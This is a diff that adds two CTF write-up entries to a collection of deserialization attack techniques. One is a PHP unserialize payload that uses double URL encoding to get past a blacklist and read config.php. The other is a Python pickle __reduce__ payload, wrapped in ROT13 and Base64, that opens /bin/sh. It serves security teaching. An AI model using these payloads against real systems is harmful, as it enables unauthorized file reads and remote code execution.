@@ -13,6 +13,8 @@ For core injection attacks (SQLi, SSTI, SSRF, XXE, command injection), see [serv
 - [PHP SoapClient CRLF SSRF via __call() Deserialization (N1CTF 2018)](#php-soapclient-crlf-ssrf-via-__call-deserialization-n1ctf-2018)
 - [Java TiedMapEntry + LazyMap + Reflection HashMap Patch (Trend Micro 2018)](#java-tiedmapentry--lazymap--reflection-hashmap-patch-trend-micro-2018)
 - [Werkzeug SecureCookie Pickle RCE after SECRET_KEY Leak (CSAW 2018 Finals)](#werkzeug-securecookie-pickle-rce-after-secret_key-leak-csaw-2018-finals)
+- [PHP unserialize + Double URL Encoding curl LFI (FireShell CTF 2019)](#php-unserialize--double-url-encoding-curl-lfi-fireshell-ctf-2019)
+- [Python Pickle RCE Wrapped in ROT13(Base64) (TAMUctf 2019)](#python-pickle-rce-wrapped-in-rot13base64-tamuctf-2019)
 
 ---
 
@@ -382,5 +384,60 @@ cookie = SecureCookie({'name': Pwn()}, SECRET_KEY).serialize()
 **Key insight:** Any framework that mixes `pickle` with HMAC-signed cookies is a SECRET_KEY leak away from RCE. Flask's default `itsdangerous` uses JSON, but older apps on `SecureCookie` or custom signers still ship pickle.
 
 **References:** CSAW 2018 Finals — NekoCat, writeups 12130, 12144
+
+---
+
+## PHP unserialize + Double URL Encoding curl LFI (FireShell CTF 2019)
+
+**Pattern:** A PHP endpoint unserializes `$_GET['gg']`, and the gadget's `__destruct()` calls `doit()` which `curl`s `$this->url`. A blacklist blocks `.php`/`.txt`/`.html` via `strpos($this->url, $ext)`, but PHP decodes the query string once before `unserialize` — anything double URL-encoded (e.g. `%252e` for `.`) survives that decode as literal `%2e`, misses the `strpos` check, then gets decoded a second time by curl before the file is read.
+
+```php
+class SHITS {
+    private $url    = "file:///var/www/html/config.php";
+    private $method = "doit";
+    private $addr; private $host; private $name;
+}
+// Replace '.' with '%252e' AFTER serialize(), then fix the string length.
+// "file:///var/www/html/config.php" (31) -> "file:///var/www/html/config%252ephp" (35 bytes on the wire,
+// 33 chars after the first decode), so set s:33 in the serialized blob.
+print str_replace('.', '%252e', urlencode(serialize(new SHITS)));
+```
+```http
+GET /?gg=O%3A5%3A%22SHITS%22%3A5%3A%7B...s%3A33%3A%22file%3A%2F%2F%2Fvar%2Fwww%2Fhtml%2Fconfig%252ephp%22...%7D
+```
+
+**Key insight:** When a filter uses `strpos`/`preg_match` *before* URL decoding but the downstream consumer decodes again, double-encoded payloads bypass text-based blacklists. With PHP `unserialize`, remember the `s:<len>` prefix must match the byte count *after* PHP's first URL decode (33 here, not 31 or 35) or the object fails to deserialize silently.
+
+**References:** FireShell CTF 2019 — Vice, writeup 13221
+
+---
+
+## Python Pickle RCE Wrapped in ROT13(Base64) (TAMUctf 2019)
+
+**Pattern:** Backup/restore endpoint round-trips Python objects through `pickle`, but encodes the result as `rot13(base64(pickle.dumps(obj)))` to obscure the format. The wrapper does not change exploitability — compose the inverse transforms before sending a `__reduce__` payload:
+
+```python
+import base64, codecs, pickle, subprocess
+
+def make_backup(obj):
+    s = base64.b64encode(pickle.dumps(obj)).decode()
+    return codecs.encode(s, 'rot-13')
+
+def parse_backup(blob):
+    s = codecs.decode(blob, 'rot-13')
+    return pickle.loads(base64.b64decode(s))
+
+class RunBinSh:
+    def __reduce__(self):
+        return (subprocess.Popen, (('/bin/sh',),))
+
+print(make_backup(RunBinSh()))
+# -> tNAwp3IvpUWiL2Im... paste into the "Load your backed up list" prompt
+```
+Send the output into the app's load endpoint; pickle instantiates `subprocess.Popen(('/bin/sh',))` on deserialize and you land in a shell.
+
+**Key insight:** Obfuscation layers like ROT13, hex, zlib, or XOR do not change the pickle threat model — just compose the inverse transforms before sending. Identify the wrapper by round-tripping a known value (e.g. encode an empty list locally, compare against the server output); any 1:1 byte-for-byte mapping is a substitution cipher and trivially invertible.
+
+**References:** TAMUctf 2019 — VeggieTales, writeup 13424
 
 ---
